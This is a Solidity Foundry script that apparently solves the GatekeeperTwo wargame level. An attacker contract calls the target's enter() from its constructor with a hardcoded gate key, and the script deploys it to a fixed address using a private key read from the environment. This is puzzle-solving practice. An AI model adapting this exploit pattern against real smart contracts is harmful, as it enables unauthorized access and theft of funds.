// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperTwo.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContract {
    constructor (address _address) {
        GatekeeperTwo gatekeeperTwoInstance = GatekeeperTwo(_address);
        bytes8 gateKey = 0xe54b1351464c8322;

        gatekeeperTwoInstance.enter(gateKey);
    }
}

contract GateKeeperTwoAttack is Script {
    GatekeeperTwo public gatekeeperTwoInstance = GatekeeperTwo(0xcD51fAcb7d44E5FDc21e3333b9a934B38c02dF66);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        new AttackerContract(address(gatekeeperTwoInstance));

        vm.stopBroadcast();
    }
} 